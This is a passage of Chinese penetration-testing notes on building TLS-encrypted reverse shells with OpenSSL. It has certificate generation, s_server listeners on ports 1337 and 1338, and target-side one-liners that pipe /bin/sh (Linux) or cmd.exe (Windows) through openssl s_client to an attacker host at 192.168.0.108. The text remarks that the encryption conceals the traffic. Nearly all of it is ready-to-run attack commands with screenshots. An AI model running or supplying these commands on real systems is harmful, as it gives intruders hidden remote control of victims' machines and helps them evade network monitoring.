	生成证书
	>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/189.png)
  #### Linux
	监听
	>openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/190.png)

	靶机执行
	>mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.108:1337 > /tmp/s; rm /tmp/s
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/191.png)

	此方式使用TLS1.2 协议对通信进行加密
  #### Windows
	攻击机需监听2个端口，一个端口发送命令，一个端口接收回显
	发送
	>openssl s_server -quiet -key key.pem -cert cert.pem -port 1337
	接收
	>openssl s_server -quiet -key key.pem -cert cert.pem -port 1338
	靶机执行
	>openssl s_client -quiet -connect 192.168.0.108:1337|cmd.exe|openssl s_client -quiet -connect 192.168.0.108:1338
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/192.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/193.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/194.png)